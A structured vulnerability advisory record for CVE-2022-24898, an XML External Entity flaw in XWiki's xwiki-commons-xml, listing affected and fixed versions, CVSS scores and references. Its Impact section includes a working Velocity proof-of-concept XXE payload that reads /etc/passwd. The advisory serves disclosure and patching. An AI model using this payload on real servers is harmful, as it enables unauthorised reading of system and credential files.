advisory_id: GHSA-m2r5-4w96-qxg5
datasource_id: github_osv_importer_v2/GHSA-m2r5-4w96-qxg5
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/04/GHSA-m2r5-4w96-qxg5/GHSA-m2r5-4w96-qxg5.json
aliases:
  - CVE-2022-24898
summary: |
  Arbitrary file access through XML parsing in org.xwiki.commons:xwiki-commons-xml
  ### Impact

  It's possible in a script to access any file accessing to the user running XWiki application server with XML External Entity Injection through the XML script service.

  For example:

  ```
  {{velocity}}
  #set($xml=$services.get('xml'))
  #set($xxe_payload = "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root[<!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><root><foo>&xxe;</foo></root>")
  #set($doc=$xml.parse($xxe_payload))
  $xml.serialize($doc)
  {{/velocity}}
  ```

  ### Patches

  The problem has been patched on versions 12.10.10, 13.4.4 and 13.8RC1.

  ### Workarounds

  There's no easy workaround for fixing this vulnerability other than upgrading and being careful when giving Script rights.

  ### References

  https://jira.xwiki.org/browse/XWIKI-18946

  ### For more information

  If you have any questions or comments about this advisory:
  * Open an issue in [Jira XWiki](https://jira.xwiki.org)
  * Email us at [XWiki Security mailing-list](mailto:security@xwiki.org)
impacted_packages:
  - purl: pkg:maven/org.xwiki.commons/xwiki-commons-xml
    affected_versions: vers:maven/>=2.7|<12.10.10
    fixed_versions: vers:maven/12.10.10
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.xwiki.commons/xwiki-commons-xml
    affected_versions: vers:maven/>=13.0.0|<13.4.4
    fixed_versions: vers:maven/13.4.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.xwiki.commons/xwiki-commons-xml
    affected_versions: vers:maven/<=13.7
    fixed_versions: vers:maven/13.8-rc-1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '4.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/04/GHSA-m2r5-4w96-qxg5/GHSA-m2r5-4w96-qxg5.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-611
references:
  - url: https://github.com/xwiki/xwiki-commons
    reference_type:
    reference_id:
  - url: https://github.com/xwiki/xwiki-commons/commit/947e8921ebd95462d5a7928f397dd1b64f77c7d5
    reference_type:
    reference_id:
  - url: https://github.com/xwiki/xwiki-commons/security/advisories/GHSA-m2r5-4w96-qxg5
    reference_type:
    reference_id:
  - url: https://jira.xwiki.org/browse/XWIKI-18946
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-24898
    reference_type:
    reference_id: CVE-2022-24898
